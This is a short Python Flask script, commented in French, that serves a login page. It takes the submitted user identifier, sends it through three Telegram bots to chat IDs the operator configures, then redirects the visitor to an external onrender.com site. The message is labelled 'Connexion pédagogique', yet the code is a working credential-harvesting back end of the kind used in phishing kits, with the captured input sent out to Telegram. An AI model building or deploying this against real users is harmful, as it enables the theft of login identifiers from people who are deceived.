from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect
import os
import requests

# Chargement du fichier .env
dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
load_dotenv(dotenv_path=dotenv_path)

app = Flask(__name__)

# Récupération des tokens et chat ids des 3 bots
bots = [
    {
        "token": os.getenv("BOT_TOKEN_1"),
        "chat_id": os.getenv("CHAT_ID_1"),
    },
    {
        "token": os.getenv("BOT_TOKEN_2"),
        "chat_id": os.getenv("CHAT_ID_2"),
    },
    {
        "token": os.getenv("BOT_TOKEN_3"),
        "chat_id": os.getenv("CHAT_ID_3"),
    }
]

# Vérification que toutes les variables d'environnement sont présentes
for i, bot in enumerate(bots, start=1):
    if not bot["token"] or not bot["chat_id"]:
        raise ValueError(f"BOT_TOKEN_{i} ou CHAT_ID_{i} non défini dans le fichier .env")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')

        if not identifiant:
            return "Identifiant manquant", 400

        message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"

        # Envoi du message via chaque bot Telegram
        for bot in bots:
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            payload = {'chat_id': bot['chat_id'], 'text': message}
            response = requests.post(url, data=payload)

            if response.status_code != 200:
                return f"Erreur lors de l'envoi du message Telegram avec BOT_TOKEN_{bots.index(bot)+1} : {response.text}", 500

        # Redirection après succès
        return redirect("https://code-s-curit-qxie.onrender.com/")

    return render_template('login.html')


if __name__ == '__main__':
    app.run(debug=True)
